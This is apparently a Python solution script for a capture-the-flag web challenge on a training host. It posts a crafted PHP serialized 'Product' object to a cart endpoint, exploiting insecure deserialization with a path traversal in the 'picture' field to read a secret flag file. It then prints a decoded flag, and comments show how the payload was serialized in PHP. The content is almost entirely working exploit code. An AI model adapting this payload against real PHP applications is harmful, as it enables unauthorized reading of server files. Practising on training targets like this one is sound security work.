import requests
import zlib
import base64

o= b"""O:7:"Product":5:{s:2:"id";i:0;s:4:"name";s:4:"robi";s:11:"description";s:4:"robi";s:7:"picture";s:27:"../../../../secret/flag.txt";s:5:"price";i:0;}"""

#obj=base64.b64encode(zlib.compress(o))
#print(obj)

r=requests.post("http://lolshop.training.jinblack.it/api/cart.php", data={'state': o})
print(base64.b64decode("YWN0Znt3ZWxjb21lX3RvX3RoZV9uZXdfd2ViXzA4MzZlZWY3OTE2NmI1ZGM4Yn0K"))
import IPython
IPython.embed()


# php -a
# $p= new Product(0, "robi", "robi","../../../../secret/flag.txt",0);
# $p;
# echo serialize($p);
# O:7:"Product":5:{s:11:"Productid";i:0;s:13:"Productname";s:4:"robi";s:20:"Productdescription";s:4:"robi";s:16:"Productpicture";s:27:"../../../../secret/flag.txt";s:14:"Productprice";i:0;}
# r
# r.text